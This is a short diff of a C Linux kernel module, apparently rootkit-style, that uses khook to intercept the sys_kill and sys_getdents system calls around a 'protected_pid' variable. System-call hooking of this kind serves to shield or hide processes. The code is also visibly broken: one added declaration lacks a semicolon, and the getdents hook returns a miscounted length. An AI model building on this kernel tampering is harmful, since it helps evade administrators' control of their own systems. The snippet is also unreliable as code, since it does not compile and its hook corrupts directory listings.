@@ -94,7 +94,7 @@ int protected_pid = -1;
 // 　　}
 // 　　return NULL;
 // 　}
-
+static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
 static int print_pid(void)
 {
 	struct task_struct * task, * p;
@@ -207,7 +207,7 @@ static long khook_sys_kill(pid_t pid, int sig) {
 
 
 KHOOK_EXT(long, sys_getdents, struct linux_dirent64 __user *, unsigned int);
-long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
+static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
  	long ret;
  	ret = KHOOK_ORIGIN(fd, dirp, count);
 	return (ret+1);
